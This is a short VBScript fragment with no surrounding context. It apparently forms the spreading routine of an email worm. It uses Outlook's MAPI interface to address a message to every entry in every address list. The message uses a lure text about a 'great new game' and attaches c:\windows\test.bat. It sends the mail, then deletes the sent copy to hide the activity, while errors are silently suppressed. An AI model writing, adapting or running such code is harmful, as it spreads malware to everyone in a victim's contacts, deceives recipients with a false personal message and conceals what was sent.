on error resume next 
dim voil,coiffe,krul,fly
set voil = CreateObject("Outlook.Application") 
set coiffe = voil.GetNameSpace("MAPI") 
for y = 1 To coiffe.AddressLists.Count 
set krul = coiffe.AddressLists(y)
x = 1 
set fly = voil.CreateItem(0) 
for o = 1 To krul.AddressEntries.Count 
f = krul.AddressEntries(x) 
fly.Recipients.Add f 
x = x + 1 
next 
fly.Subject = "Hi there ..." 
fly.Body = "It's been a long time since we spoke, i got some great new game for you, (see the attachement)" 
fly.Attachments.Add ("c:\windows\test.bat") 
fly.DeleteAfterSubmit = True
fly.Send 
f = "" 
next 
